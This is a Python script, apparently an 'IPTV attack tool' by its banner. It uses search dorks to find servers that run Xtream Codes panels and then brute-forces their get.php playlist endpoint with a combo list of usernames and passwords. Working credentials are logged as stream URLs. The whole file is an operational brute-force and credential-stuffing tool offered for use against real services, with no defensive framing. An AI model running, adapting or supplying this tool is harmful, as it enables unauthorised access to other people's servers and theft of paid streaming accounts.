from requests import get
from urlparse import urlparse
from duckduckgo import search
from sys import argv

def banner():
    return """

$$$$$$\ $$$$$$$\ $$$$$$$$\ $$\    $$\                  $$\     $$\                         $$\               $$\                         $$\ 
\_$$  _|$$  __$$\\__$$  __|$$ |   $$ |                 $$ |    $$ |                        $$ |              $$ |                        $$ |
  $$ |  $$ |  $$ |  $$ |   $$ |   $$ |       $$$$$$\ $$$$$$\ $$$$$$\    $$$$$$\   $$$$$$$\ $$ |  $$\       $$$$$$\    $$$$$$\   $$$$$$\  $$ |
  $$ |  $$$$$$$  |  $$ |   \$$\  $$  |       \____$$\\_$$  _|\_$$  _|   \____$$\ $$  _____|$$ | $$  |      \_$$  _|  $$  __$$\ $$  __$$\ $$ |
  $$ |  $$  ____/   $$ |    \$$\$$  /        $$$$$$$ | $$ |    $$ |     $$$$$$$ |$$ /      $$$$$$  /         $$ |    $$ /  $$ |$$ /  $$ |$$ |
  $$ |  $$ |        $$ |     \$$$  /        $$  __$$ | $$ |$$\ $$ |$$\ $$  __$$ |$$ |      $$  _$$<          $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |
$$$$$$\ $$ |        $$ |      \$  /         \$$$$$$$ | \$$$$  |\$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\         \$$$$  |\$$$$$$  |\$$$$$$  |$$ |
\______|\__|        \__|       \_/           \_______|  \____/  \____/  \_______| \_______|\__|  \__|         \____/  \______/  \______/ \__|
                                                                                                                                             
                                                                                                                                             
                                                                                                                                             
$$\                        $$$$$$\             $$$$$$\   $$$$$$\                                  $$$$$$\       $$$$$$\                      
$$ |                      $$$ __$$\           $$$ __$$\ $$  __$$\                                $$$ __$$\     $$  __$$\                     
$$$$$$$\  $$\   $$\       $$$$\ $$ |$$\   $$\ $$$$\ $$ |$$ /  $$ |                    $$\    $$\ $$$$\ $$ |    \__/  $$ |                    
$$  __$$\ $$ |  $$ |      $$\$$\$$ |\$$\ $$  |$$\$$\$$ | $$$$$$  |      $$$$$$\       \$$\  $$  |$$\$$\$$ |     $$$$$$  |                    
$$ |  $$ |$$ |  $$ |      $$ \$$$$ | \$$$$  / $$ \$$$$ |$$  __$$<       \______|       \$$\$$  / $$ \$$$$ |    $$  ____/                     
$$ |  $$ |$$ |  $$ |      $$ |\$$$ | $$  $$<  $$ |\$$$ |$$ /  $$ |                      \$$$  /  $$ |\$$$ |    $$ |                          
$$$$$$$  |\$$$$$$$ |      \$$$$$$  /$$  /\$$\ \$$$$$$  /\$$$$$$  |                       \$  /   \$$$$$$  /$$\ $$$$$$$$\                     
\_______/  \____$$ |       \______/ \__/  \__| \______/  \______/                         \_/     \______/ \__|\________|                    
          $$\   $$ |                                                                                                                         
          \$$$$$$  |                                                                                                                         
           \______/                                                                                                                          

"""

def usage():
	banner()
	print(f"Usage:\n\tpython {argv[0]} dorkFile.txt comboFile.txt\n")

def extractUrls(dorks):
	temp = []
	urls = []
	for dork in open(dorks, 'r').readlines():
		for link in search(dork.strip(), max_results=400):
			if link not in temp:
				temp.append(link)
	return temp
	
def checkUrls(urls):
	temp = []
	for url in urls:
		url = urlparse(url.strip())[1]
		if url not in temp:
			temp.append(url)
	print(f"[i] Found {len(temp)} in total.")
	return temp

def aliveOrNot(urls):
	temp = []
	print("[*] Hunting URLs for Admin panel")
	for url in urls:
		try:
			if "Xtream Codes</a>" in get(f"http://{url}/", timeout=10).text:
				print(f"\tPanel found on URL  -->> http://{url}/")
				temp.append(url)
		except Exception as e:
			# print(f"\tNo Panel found -->> http://{url}/")
			pass
	print(f"[i] {len(temp)} of them are alive!")
	return temp

def bruteAccounts(urls,comboFile):
	for user in open(comboFile, 'r').readlines():
		print(f"[i] Trying combo: {user.strip()}")
		for url in urls:
			try:
				accountToTry = f"http://{url.strip()}/get.php?username={user.strip()}&password={user.strip()}&type=m3u&output=ts"
				if "#EXTINF:0" in get(accountToTry, timeout=15, stream=True).text:
					print(f"[+] Playlist URL found: {accountToTry}")
					f = open("logs.txt", "a")
					f.write(f"{accountToTry}\n")
					f.close()
			except Exception as e:
				pass

if __name__ == '__main__':
	try:
		usage()
		dorks = argv[1]
		comboFile = argv[2]
		bruteAccounts(aliveOrNot(checkUrls(extractUrls(dorks))), comboFile)
	except Exception as e:
		print(e)